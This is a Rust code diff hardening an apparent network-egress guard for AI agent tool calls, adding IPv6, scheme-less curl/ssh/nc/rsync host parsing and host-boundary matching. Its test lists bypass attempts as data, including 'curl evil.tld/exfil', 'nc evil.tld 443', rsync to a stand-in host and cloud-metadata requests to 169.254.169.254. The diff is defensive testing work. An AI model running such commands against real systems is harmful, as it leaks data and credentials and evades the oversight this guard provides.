@@ -35,10 +35,10 @@ static NETWORK: LazyLock<Regex> = LazyLock::new(|| {
 // Tools that reach a URL by themselves (`web_fetch`, `browser_exec`, ...).
 static NETWORK_TOOL: LazyLock<Regex> =
     LazyLock::new(|| Regex::new(r"(?i)fetch|browse|browser|web|http|url|download").unwrap());
-static AUTHORITY: LazyLock<Regex> = LazyLock::new(|| Regex::new(r#"://([^\s/?#"'\\`)\]>]*)"#).unwrap());
+static AUTHORITY: LazyLock<Regex> =
+    LazyLock::new(|| Regex::new(r#"://([^\s/?#"'\\`)\]\[]*(?:\[[^\s/?#"'\\`)\]>]+\])?[^\s/?#"'\\`)\]>]*)"#).unwrap());
 static HOST: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"^[a-z0-9.-]*").unwrap());
 static IPV4_AT: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"^\d{1,3}(?:\.\d{1,3}){3}").unwrap());
-static IPV4_FULL: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"^\d{1,3}(?:\.\d{1,3}){3}$").unwrap());
 
 /// Tool names in the request's `tools`: OpenAI `function.name`, Anthropic `name`.
 pub fn declared_tools(request: &Value) -> HashSet<String> {
@@ -81,23 +81,189 @@ fn ipv4_literals(text: &str) -> Vec<&str> {
     found
 }
 
-/// Lowercased hosts in `text`: the host of `scheme://` URLs and bare IPv4 literals.
-pub fn extract_hosts(text: &str) -> Vec<String> {
+/// Lowercased hosts from `scheme://` URLs (including bracketed IPv6 literals).
+fn extract_url_hosts(text: &str) -> BTreeSet<String> {
     let text = text.to_lowercase();
     let mut hosts = BTreeSet::new();
     for authority in AUTHORITY.captures_iter(&text) {
         let host_and_port = authority[1].rsplit('@').next().unwrap_or("");
-        let host = HOST.find(host_and_port).map_or("", |m| m.as_str());
+        if let Some(rest) = host_and_port.strip_prefix('[') {
+            if let Some((inside, _)) = rest.split_once(']') {
+                let addr = inside.split('%').next().unwrap_or(inside);
+                if !addr.is_empty() && addr.bytes().all(|b| b.is_ascii_hexdigit() || matches!(b, b':' | b'.')) {
+                    hosts.insert(addr.to_string());
+                }
+            }
+            continue;
+        }
+        let host = HOST.find(host_and_port).map_or("", |m| m.as_str()).trim_end_matches('.');
         if !host.is_empty() {
             hosts.insert(host.to_string());
         }
     }
-    for ip in ipv4_literals(&text) {
+    hosts
+}
+
+/// Valid bare IPv4 literals in `text`.
+fn extract_bare_ips(text: &str) -> BTreeSet<String> {
+    let mut hosts = BTreeSet::new();
+    for ip in ipv4_literals(text) {
         if ip.split('.').all(|octet| octet.parse::<u32>().is_ok_and(|n| n <= 255)) {
             hosts.insert(ip.to_string());
         }
     }
+    hosts
+}
+
+/// Lowercased hosts in `text`: the host of `scheme://` URLs and bare IPv4 literals.
+pub fn extract_hosts(text: &str) -> Vec<String> {
+    let mut hosts = extract_url_hosts(text);
+    hosts.extend(extract_bare_ips(&text.to_lowercase()));
     hosts.into_iter().collect()
+}
+
+fn host_from_operand(raw: &str) -> Option<String> {
+    let candidate = raw.split(['/', '?', '#']).next().unwrap_or("");
+    let candidate = candidate.rsplit('@').next().unwrap_or(candidate);
+    let candidate = candidate.split(':').next().unwrap_or(candidate).trim_end_matches('.').to_ascii_lowercase();
+    if candidate.is_empty() || !candidate.contains('.') {
+        return None;
+    }
+    if !candidate.bytes().all(|b| b.is_ascii_alphanumeric() || matches!(b, b'.' | b'-')) {
+        return None;
+    }
+    let tld = candidate.rsplit('.').next()?;
+    if tld.len() < 2 || !tld.bytes().all(|b| b.is_ascii_alphabetic()) {
+        return None;
+    }
+    Some(candidate)
+}
+
+/// Scheme-less host operands in CLI network clients (`curl evil.tld/x`, `ssh user@evil.tld`, `nc evil.tld 443`).
+fn extract_cli_hosts(text: &str) -> BTreeSet<String> {
+    const CURL_VALUE_FLAGS: &[&str] = &[
+        "-o", "-O", "-H", "-d", "-F", "-u", "-A", "-e", "-b", "-c", "-T", "-X", "-m", "-w", "-x", "-K",
+        "--header", "--data", "--data-binary", "--data-raw", "--data-urlencode", "--output", "--user",
+        "--proxy", "--resolve", "--connect-to", "--cookie", "--referer", "--user-agent", "--request",
+        "--max-time", "--connect-timeout", "--form", "--upload-file", "--cacert", "--cert", "--key", "--config",
+    ];
+    const SSH_VALUE_FLAGS: &[&str] = &["-i", "-p", "-l", "-o", "-F", "-J", "-L", "-R", "-D", "-W", "-b", "-c", "-e", "-S", "-B", "-E", "-I", "-m", "-O", "-Q", "-w"];
+    const NC_VALUE_FLAGS: &[&str] = &["-p", "-s", "-w", "-i", "-x", "-X", "-e", "-c", "-I", "-O", "-T", "-V"];
+
+    let mut hosts = BTreeSet::new();
+    let script = superviser_scan::shell::parse(text);
+    for command in script.commands() {
+        let Some(name) = command.name().map(str::to_ascii_lowercase) else { continue };
+        let args = &command.words[1..];
+        match name.as_str() {
+            "curl" | "wget" => {
+                let mut skip_next = false;
+                for arg in args {
+                    if skip_next {
+                        skip_next = false;
+                        continue;
+                    }
+                    if CURL_VALUE_FLAGS.contains(&arg.as_str()) {
+                        skip_next = true;
+                        continue;
+                    }
+                    if arg.starts_with('-') || arg.starts_with('/') || arg.starts_with('.') || arg.starts_with('~') || arg.contains("://") {
+                        continue;
+                    }
+                    if let Some(host) = host_from_operand(arg) {
+                        hosts.insert(host);
+                    }
+                }
+            }
+            "ssh" | "sftp" => {
+                let mut skip_next = false;
+                for arg in args {
+                    if skip_next {
+                        skip_next = false;
+                        continue;
+                    }
+                    if SSH_VALUE_FLAGS.contains(&arg.as_str()) {
+                        skip_next = true;
+                        continue;
+                    }
+                    if arg.starts_with('-') {
+                        continue;
+                    }
+                    if !arg.contains("://")
+                        && let Some(host) = host_from_operand(arg)
+                    {
+                        hosts.insert(host);
+                    }
+                    break;
+                }
+            }
+            "scp" | "rsync" => {
+                let mut skip_next = false;
+                for arg in args {
+                    if skip_next {
+                        skip_next = false;
+                        continue;
+                    }
+                    if SSH_VALUE_FLAGS.contains(&arg.as_str()) {
+                        skip_next = true;
+                        continue;
+                    }
+                    if arg.starts_with('-') || arg.starts_with('/') || arg.starts_with('.') || arg.contains("://") {
+                        continue;
+                    }
+                    if let Some((remote, _)) = arg.split_once(':')
+                        && let Some(host) = host_from_operand(remote)
+                    {
+                        hosts.insert(host);
+                    }
+                }
+            }
+            "nc" | "ncat" | "netcat" | "telnet" | "ftp" => {
+                let mut skip_next = false;
+                for arg in args {
+                    if skip_next {
+                        skip_next = false;
+                        continue;
+                    }
+                    if NC_VALUE_FLAGS.contains(&arg.as_str()) {
+                        skip_next = true;
+                        continue;
+                    }
+                    if arg.starts_with('-') {
+                        continue;
+                    }
+                    if !arg.contains("://")
+                        && let Some(host) = host_from_operand(arg)
+                    {
+                        hosts.insert(host);
+                    }
+                    break;
+                }
+            }
+            _ => {}
+        }
+    }
+    hosts
+}
+
+/// Whether `context` mentions `host` on host boundaries (so `127.0.0.1` doesn't allow `27.0.0.1`
+/// and `github.com` doesn't allow `hub.com`).
+fn context_mentions(context: &str, host: &str) -> bool {
+    let bytes = context.as_bytes();
+    let is_ipv6 = host.contains(':');
+    let mut from = 0;
+    while let Some(pos) = context[from..].find(host) {
+        let start = from + pos;
+        let end = start + host.len();
+        let bound = |b: u8| !(b.is_ascii_alphanumeric() || matches!(b, b'.' | b'-') || (is_ipv6 && b == b':'));
+        let before_ok = start == 0 || bound(bytes[start - 1]);
+        let after_ok = end == bytes.len() || bound(bytes[end]);
+        if before_ok && after_ok {
+            return true;
+        }
+        from = start + 1;
+    }
+    false
 }
 
 /// The text a call's raw JSON arguments carry: every string value, decoded, so a command's
@@ -131,6 +297,12 @@ impl Policy {
         if let Some(messages) = context.get_mut("messages").and_then(Value::as_array_mut) {
             messages.retain(|m| m.get("role").and_then(Value::as_str) != Some("assistant"));
         }
+        if let Some(input) = context.get_mut("input").and_then(Value::as_array_mut) {
+            input.retain(|m| {
+                m.get("role").and_then(Value::as_str) != Some("assistant")
+                    && m.get("type").and_then(Value::as_str) != Some("function_call")
+            });
+        }
         Self {
             declared: declared_tools(request),
             context: crate::compact_json(&context).to_lowercase(),
@@ -154,17 +326,18 @@ impl Policy {
         if !(network_tool || NETWORK.is_match(&text)) {
             return None;
         }
-        // A URL's host counts anywhere in such a call; a bare IP only on a line that reaches out.
+        // A URL's host counts anywhere in such a call (even on a different line); a bare IP or
+        // scheme-less CLI operand counts on lines that reach out.
         let reaching = if network_tool {
             text.clone()
         } else {
             text.lines().filter(|line| NETWORK.is_match(line)).collect::<Vec<_>>().join("\n")
         };
-        let mut hosts: BTreeSet<String> =
-            extract_hosts(&text).into_iter().filter(|h| !IPV4_FULL.is_match(h)).collect();
-        hosts.extend(extract_hosts(&reaching));
+        let mut hosts: BTreeSet<String> = extract_url_hosts(&text);
+        hosts.extend(extract_bare_ips(&reaching));
+        hosts.extend(extract_cli_hosts(&reaching));
         for host in hosts {
-            if self.context.contains(&host) {
+            if context_mentions(&self.context, &host) {
                 continue;
             }
             if self.allowed_hosts.iter().any(|a| host == *a || host.ends_with(&format!(".{a}"))) {
@@ -279,5 +452,25 @@ pub(crate) mod tests {
         assert!(p.check("bash", &json!({"command": "curl -s http://10.9.8.7/x"}).to_string()).is_some());
         let code = "import urllib.request\nURL = 'https://reveng.online/a.json'";
         assert!(p.check("bash", &json!({"command": code}).to_string()).is_some());
+    }
+
+    #[test]
+    fn blocks_ipv6_multiline_ip_schemeless_and_substring_bypasses() {
+        let p = policy(&bash_request("Check 127.0.0.1 and github.com"));
+        // IPv6 URLs (including IPv4-mapped IMDS) are extracted and checked.
+        assert!(p.check("bash", r#"{"cmd": "curl http://[::ffff:169.254.169.254]/latest/meta-data/"}"#).is_some());
+        assert!(p.check("bash", r#"{"cmd": "curl http://[2606:4700::1111]/"}"#).is_some());
+        // Multiline http://<IPv4> is not stripped by bare-IP line filtering.
+        assert!(p.check("bash", r#"{"cmd": "curl \\\n http://169.254.169.254/latest/meta-data/"}"#).is_some());
+        assert!(p.check("bash", r#"{"cmd": "import urllib.request\nURL = 'http://169.254.169.254/'"}"#).is_some());
+        // Context matching enforces host boundaries.
+        assert!(p.check("bash", r#"{"cmd": "curl http://27.0.0.1/x"}"#).is_some());
+        assert!(p.check("bash", r#"{"cmd": "curl https://hub.com/x"}"#).is_some());
+        // Scheme-less CLI network targets are checked.
+        assert!(p.check("bash", r#"{"cmd": "curl evil.tld/exfil"}"#).is_some());
+        assert!(p.check("bash", r#"{"cmd": "ssh user@evil.tld id"}"#).is_some());
+        assert!(p.check("bash", r#"{"cmd": "nc evil.tld 443"}"#).is_some());
+        assert!(p.check("bash", r#"{"cmd": "rsync -a ./ user@evil.tld:/tmp/"}"#).is_some());
+        assert_eq!(p.check("bash", r#"{"cmd": "rsync -a src/ dst/"}"#), None);
     }
 }
